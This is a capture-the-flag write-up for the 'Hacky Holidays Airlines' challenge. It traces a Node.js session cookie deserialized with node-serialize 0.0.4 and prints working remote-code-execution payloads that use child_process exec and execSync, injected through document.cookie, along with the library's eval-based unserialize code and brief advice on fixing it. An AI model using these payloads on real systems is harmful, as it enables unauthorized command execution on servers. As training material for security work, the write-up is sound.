# HACKY HOLIDAYS AIRLINES

When examining the code, there were three notable parts that could turn into an attack vector.

* routes/login.js - post username,password
* routes/signup.js - post username,country,password
* routes/index.js - cookie session

These parts were examined further.

login.js and signup.js were code that quarries input values into the database, and no problem seemed to have been present.
It was possible that sequelize, which was used when quarrying, could contain an issue, but the possibility was determined to be low.
Also, after examining the github page of sequelize, updates for it were frequent and the version 6.17.0, which is the version used on this page, was not too far behind.

### index.js
```js
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');

module.exports = (app, globalConfig) => {
    app.use(cookieParser())
    app.get('/', function(req, res) {
      if (req.cookies.session){
        authorized = true;
          var cookieValue = new Buffer(escape((req.cookies.session)), 'base64').toString();
          console.log(cookieValue);
          var userInfo = serialize.unserialize(cookieValue);
          console.log(userInfo);
        if (userInfo.username) {
          res.render('index', { title: 'Home', username: userInfo.username , authorized: authorized});
        }
        } else {
        authorized = false;
        res.render('index', { title: 'Home', authorized: authorized });
      }
    });
};
```

In index.js, the node-serialize module was used to unserialize the session value from user input.
When investigating on the module, the first google page search immediately revealed a vulnerability in it.
<https://snyk.io/test/npm/node-serialize>


The version that had the vulnerability was 0.0.4, and reading through the package.json showed that the exact same version was being used.
Reading the payload provided by the vulnerability page made me realize that the controlling the string that gets delivered to the unserialize was possible, then running node js code was also possible.

### Provided payload
```js
var serialize = require('node-serialize');
var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
serialize.unserialize(payload);
```

In index.js, the session value was running in the function unserialize with no restrictions as a parameter after decoding in base64. This meant that an attack could be made immediately,
Fixes were made to allow running the payload in the chrome dev tools.
It was also allowed to run in the window os, which was under use for testing.

### Test payload
```js
payload=String.raw`{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('ver', function(error, stdout, stderr) { console.log(stdout) });}()"}`
document.cookie=`session=${btoa(payload)}`
```

The following payload was inputed into the developer console and after the page was refreshed, a command line was successfully executed.
![](https://raw.githubusercontent.com/lukehyun/hacky_holidays_airlines/main/1.png)

The execution of a command line was observed as possible in a test environment, but in the actual page a console window was unobservable hence making it unusable.  
Because userinfo.username which is the return value of unserialize is being rendered, if the format {'username':'data for render'} was returned from the unserilize function, its return value can be seen in the browser.

### unserialize function
```js
exports.unserialize = function(obj, originObj) {
  var isIndex;
  if (typeof obj === 'string') {
    obj = JSON.parse(obj);
    isIndex = true;
  }
  originObj = originObj || obj;

  var circularTasks = [];
  var key;
  for(key in obj) {
    if(obj.hasOwnProperty(key)) {
      if(typeof obj[key] === 'object') {
        obj[key] = exports.unserialize(obj[key], originObj);
      } else if(typeof obj[key] === 'string') {
        if(obj[key].indexOf(FUNCFLAG) === 0) {
          obj[key] = eval('(' + obj[key].substring(FUNCFLAG.length) + ')');
        } else if(obj[key].indexOf(CIRCULARFLAG) === 0) {
          obj[key] = obj[key].substring(CIRCULARFLAG.length);
          circularTasks.push({obj: obj, key: key});
        }
      }
    }
  }

  if (isIndex) {
    circularTasks.forEach(function(task) {
      task.obj[task.key] = getKeyPath(originObj, task.obj[task.key]);
    });
  }
  return obj;
};
```

When reading through the unserialize function, all key values sent as parameters are executed in the eval function and its return value is overwritten to each key and the dictionay is returned again.
Therefore, in the test payload changing {"rce" to username will format the return value in the desired way.
Executing the command line was altered without using callback functions, but with execSync which immediately returns the run results.

The issue with this code is that it used eval to reverse a serialized function.
But it seemed using eval was the only way to achieve 
When searching for similar functions to replace, the serialize-javascript module was found, but it also stated that eval was to be used when reversing.
Therefore, when developing, if the serialize function must be used, then it is important to not include user input or include it only under strict formatting.
<https://github.com/yahoo/serialize-javascript#deserializing>


### payload printed in http response
```js
cmd='ver'
payload=String.raw`{"username":"_$$ND_FUNC$$_function (){return require('child_process').execSync('${cmd}').toString();}()"}`
document.cookie=`session=${btoa(payload)}`
```

![](https://raw.githubusercontent.com/lukehyun/hacky_holidays_airlines/main/2.png)


### getting flag
Now using the payload above, the command line can be run on the actual page and the flag was retrieved with ls flag. 

![](https://raw.githubusercontent.com/lukehyun/hacky_holidays_airlines/main/3.png)
![](https://raw.githubusercontent.com/lukehyun/hacky_holidays_airlines/main/4.png)
![](https://raw.githubusercontent.com/lukehyun/hacky_holidays_airlines/main/5.png)
![](https://raw.githubusercontent.com/lukehyun/hacky_holidays_airlines/main/6.png)
![](https://raw.githubusercontent.com/lukehyun/hacky_holidays_airlines/main/7.png)
![](https://raw.githubusercontent.com/lukehyun/hacky_holidays_airlines/main/8.png)